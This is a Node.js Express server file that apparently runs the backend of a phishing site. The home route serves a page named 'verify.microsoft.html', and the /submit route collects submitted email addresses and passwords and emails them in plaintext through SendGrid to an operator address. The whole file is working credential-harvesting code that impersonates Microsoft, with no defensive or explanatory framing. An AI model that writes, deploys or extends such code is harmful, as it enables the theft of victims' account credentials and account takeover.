const express = require('express');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Configure SendGrid from environment variables
const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
const RECEIVER_EMAIL = process.env.RECEIVER_EMAIL;

if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
  console.warn('⚠️ SENDGRID_API_KEY or RECEIVER_EMAIL missing. Emails will not be sent.');
} else {
  sgMail.setApiKey(SENDGRID_API_KEY);
}

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Routes

// Home page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'verify.microsoft.html'));
});

// Form submission
app.post('/submit', async (req, res) => {
  const { email, password } = req.body;

  if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
    return res.status(500).send('Server not configured to send emails.');
  }

  const msg = {
    to: RECEIVER_EMAIL,
    from: RECEIVER_EMAIL,
    subject: 'New Login Submission',
    text: `Email: ${email}\nPassword: ${password}`,
  };

  try {
    await sgMail.send(msg);
    res.send('✅ Form submitted successfully!');
  } catch (error) {
    console.error('SendGrid error:', error.message || error);
    res.status(500).send('❌ Error sending email.');
  }
});

// Safe test route
app.get('/test', async (req, res) => {
  if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
    return res.send('⚠️ Env vars missing. Cannot send test email.');
  }

  try {
    await sgMail.send({
      to: RECEIVER_EMAIL,
      from: RECEIVER_EMAIL,
      subject: 'Test Email',
      text: 'This is a test email from your app. No sensitive info shown here.',
    });
    res.send('✅ Test email sent successfully!');
  } catch (err) {
    console.error('SendGrid test error:', err.message || err);
    res.send('❌ Test email failed. Check logs.');
  }
});

// Start server
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
